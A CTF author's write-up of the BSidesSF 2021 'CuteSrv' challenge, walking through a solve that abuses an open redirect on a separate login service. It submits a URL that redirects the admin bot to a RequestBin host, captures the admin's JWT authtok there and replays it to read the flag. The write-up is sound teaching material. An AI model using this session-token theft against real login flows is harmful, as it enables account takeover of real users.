---
layout: post
title: "BSidesSF 2021 CTF: CuteSrv (Author Writeup)"
category: Security
date: 2021-03-08
tags:
  - CTF
  - BSidesSF
---

I authored the BSidesSF 2021 CTF Challenge "CuteSrv", which is a service to
display cute pictures.  The description from the scoreboard:

> Last year was pretty tough for all of us. I built this service of cute photos
> to help cheer you up. We do moderate for cuteness, so no inappropriate photos
> please!

Like my other write-ups, I'll do this from the perspective of a player playing
through and try not to assume internal knowledge.

Visiting the service, we find a bunch of cute pictures:

![CuteSrv](/img/bsidessf/cutesrv.png)

Since we just see links for Login and Submit at the top, it's worth checking
those out.  Submit redirects us to the login page, so let's login.  We
explicitly see that it's redirecting us to a "LoginSVC" login page to do the
login.  This is on a different domain than the CuteSrv.

On this page, you can login or register.  My first instinct would be to check
for SQL injection, but even with SQLmap, I'm not finding anything.  We create an
account and are redirected back to CuteSrv.  Now we only have the Submit link,
which prompts us for a URL to submit.

![CuteSrv Submit Page](/img/bsidessf/cutesrv_submit.png)

Since it mentions that all submissions will be reviewed, I assume the admin will
see a page with either the URL or the maybe the URL will be placed in an image
tag for them to preview.  In any case, this seems like a likely XSS vector, so
we can try some payloads.  Unfortunately, none of those payloads get us
anything.

I start looking at the source for the webpages to see anything I've missed.  I
notice a hidden link to `/flag.txt`, so I figure I'll just check that, though it
seems too obvious for a challenge that's not a **101**.  As expected, I just get
`Not Authorized` here.

Let's see if we can verify that the admin is seeing our submissions.  We can use
a [RequestBin](https://requestbin.com/) (or host something ourselves) and just
use that URL for the image to see if we can get any request at all.  We submit
our RequestBin URL and almost immediately see a request that tells us the admin
visited.

Maybe there's a vulnerability in the login page.  If nothing else, it's pretty
unusual for a CTF challenge to use two separate domains and services.  If we
logout and go to login again, and follow the flow carefully, we'll see a set of
requests:

```
- GET https://loginsvc-0af88b56.challenges.bsidessf.net/check?continue=https%3A%2F%2Fcutesrv-0186d981.challenges.bsidessf.net%2Fsetsid
- GET https://loginsvc-0af88b56.challenges.bsidessf.net/login?continue=https%3A%2F%2Fcutesrv-0186d981.challenges.bsidessf.net%2Fsetsid
- (Perform login)
- POST https://loginsvc-0af88b56.challenges.bsidessf.net/login
- GET https://loginsvc-0af88b56.challenges.bsidessf.net/check?continue=https%3A%2F%2Fcutesrv-0186d981.challenges.bsidessf.net%2Fsetsid
- GET https://cutesrv-0186d981.challenges.bsidessf.net/setsid?authtok=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRodG9rIiwiZXhwIjoxNjE3OTQ5MDIzLCJpYXQiOjE2MTUyNzA2MjMsImlzcyI6ImxvZ2luc3ZjIiwibmJmIjoxNjE1MjcwNjIzLCJzdWIiOiJmb28ifQ.d1Cu3aXU6fUOgc0W4p3E3geViK1faqsKusWzHKOG-8htQJEzv5h-IgX5q6ZJs4LhaeK4r2Ngmb18oaw2LY7OIA
- GET https://cutesrv-0186d981.challenges.bsidessf.net/
```

We notice that the authentication token gets passed as a GET parameter from one
service to another.  If you're familiar with it, you may recognize it as a
[JWT](https://jwt.io/).  Maybe we can craft our own token for the admin user, as
sometimes [JWT implementations have
vulnerabilities](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/).
Unfortunately, every token I attempt to craft is rejected by the service and
results in me being in a logged-out state.

If we're already logged in, the `/check` endpoint on LoginSVC automatically
redirects us to our continue URL.  I quickly try some variations on the URL
provided by CuteSRV and notice that LoginSVC *seems* to accept any URL I throw
at it.  Perhaps I can make use of this [open
redirect](https://cwe.mitre.org/data/definitions/601.html) somehow.  If I can
get the admin to visit my server from the login service, maybe I can steal the
`authtok` parameter and use it.  I try submitting the `/check` URL with a
`continue` parameter that points to my RequestBin (i.e., `https://loginsvc-0af88b56.challenges.bsidessf.net/check?continue=https://enwc1bz9v7lve.x.pipedream.net/`) in the image
submission form.

Almost immediately, there's a request to my RequestBin with a different
`authtok` as a query parameter!  I copy the `authtok` and use it with the
`/setsid` path on CuteSRV:

```
https://cutesrv-0186d981.challenges.bsidessf.net/setsid?authtok=eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhdXRodG9rIiwiZXhwIjoxNjE3OTUwMDIxLCJpYXQiOjE2MTUyNzE2MjEsImlzcyI6ImxvZ2luc3ZjIiwibmJmIjoxNjE1MjcxNjIxLCJzdWIiOiJhZG1pbiJ9.OulATR3pPROVZh9BCfwEbHYHceLAnPXxL3g9Q6T2AfTIP8qTZidqdpvPLrT8HwkYyyZwgyhdkoQkN2H--FXW0Q
```

It appears to give me a valid session, so I try the `/flag.txt` endpoint again
and am rewarded:

```
FLAG: CTF{i_hope_you_made_it_through_2020_okay}
```
